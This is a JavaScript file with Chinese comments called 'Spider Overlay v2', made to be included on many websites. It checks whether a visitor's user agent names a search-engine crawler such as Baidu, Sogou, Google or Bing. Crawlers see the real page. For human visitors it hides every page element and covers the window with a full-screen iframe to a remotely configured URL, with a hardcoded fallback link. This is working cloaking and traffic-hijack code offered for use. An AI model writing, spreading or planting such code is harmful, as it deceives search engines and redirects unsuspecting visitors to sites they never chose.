/**
 * Spider Overlay v2 — Netlify 版
 *
 * 所有项目只需引入这一个文件，不需要任何配置。
 * 跳转目标、爬虫列表全部由同目录下的 config.json 统一控制。
 *
 * 用法（所有项目完全一样）：
 *   <script src="https://你的域名/spider-overlay.js"></script>
 *
 * 注意：本文件不包含任何后台地址，后台地址只有你自己知道。
 */

(function () {
  'use strict';

  var FALLBACK_CONFIG = {
    targetUrl: 'https://dh-hzh5.hbaissa.cn?cid=1034',
    enabled: true,
    spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
    zIndex: 9999,
    bgColor: 'white'
  };

  var CACHE_KEY = '__so_cfg__';
  var CACHE_TTL = 2 * 60 * 1000; // 2 分钟

  // ======================== 自动推断 config.json 地址 ========================
  function getCurrentScript() {
    if (document.currentScript) return document.currentScript;
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      if (scripts[i].src && scripts[i].src.indexOf('spider-overlay.js') > -1) {
        return scripts[i];
      }
    }
    return null;
  }

  var scriptEl = getCurrentScript();
  var configUrl = '';

  // 优先 data-config 属性，否则自动推导为同目录下的 config.json
  if (scriptEl) {
    configUrl = scriptEl.getAttribute('data-config') || '';
    if (!configUrl && scriptEl.src) {
      configUrl = scriptEl.src.replace(/spider-overlay\.js(\?.*)?$/, 'config.json');
    }
  }

  // ======================== 加载配置 ========================
  function loadConfig(cb) {
    // 1. 读缓存
    try {
      var cached = JSON.parse(localStorage.getItem(CACHE_KEY));
      if (cached && cached._ts && (Date.now() - cached._ts < CACHE_TTL)) {
        cb(cached);
        refreshCache(); // 后台静默刷新
        return;
      }
    } catch(e) {}

    // 2. fetch 远程配置
    fetchConfig(cb);
  }

  function fetchConfig(cb) {
    if (!configUrl) {
      cb(FALLBACK_CONFIG);
      return;
    }
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : Promise.reject('HTTP ' + r.status); })
      .then(function(cfg) {
        cfg._ts = Date.now();
        try { localStorage.setItem(CACHE_KEY, JSON.stringify(cfg)); } catch(e) {}
        cb(cfg);
      })
      .catch(function() {
        // 降级：过期缓存 > 默认值
        try {
          var old = JSON.parse(localStorage.getItem(CACHE_KEY));
          if (old) { cb(old); return; }
        } catch(e) {}
        cb(FALLBACK_CONFIG);
      });
  }

  function refreshCache() {
    if (!configUrl) return;
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(cfg) {
        if (cfg) {
          cfg._ts = Date.now();
          try { localStorage.setItem(CACHE_KEY, JSON.stringify(cfg)); } catch(e) {}
        }
      })
      .catch(function() {});
  }

  // ======================== 核心 ========================
  function isSpider(spiders) {
    var ua = navigator.userAgent.toLowerCase();
    for (var i = 0; i < spiders.length; i++) {
      if (ua.indexOf(spiders[i].toLowerCase()) > -1) return true;
    }
    return false;
  }

  function applyOverlay(cfg) {
    if (!cfg || cfg.enabled === false) return;
    if (isSpider(cfg.spiders)) return;

    function insert() {
      if (document.getElementById('spider-overlay-iframe')) return;
      var iframe = document.createElement('iframe');
      iframe.id = 'spider-overlay-iframe';
      iframe.src = cfg.targetUrl;
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
      iframe.style.cssText =
        'position:fixed!important;top:0!important;left:0!important;' +
        'width:100vw!important;height:100vh!important;border:none!important;' +
        'z-index:' + (cfg.zIndex || 9999) + '!important;' +
        'background:' + (cfg.bgColor || 'white') + '!important;' +
        'margin:0!important;padding:0!important;';

      var body = document.body;
      if (body) {
        for (var i = 0; i < body.children.length; i++) {
          body.children[i].style.display = 'none';
        }
        body.appendChild(iframe);
      } else {
        document.addEventListener('DOMContentLoaded', insert);
      }
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', insert);
    } else {
      insert();
    }
  }

  loadConfig(applyOverlay);

  // 调试 API（生产环境可通过 enabled=false 关闭）
  window.SpiderOverlay = {
    clearCache: function() {
      try { localStorage.removeItem(CACHE_KEY); } catch(e) {}
      location.reload();
    }
  };

})();
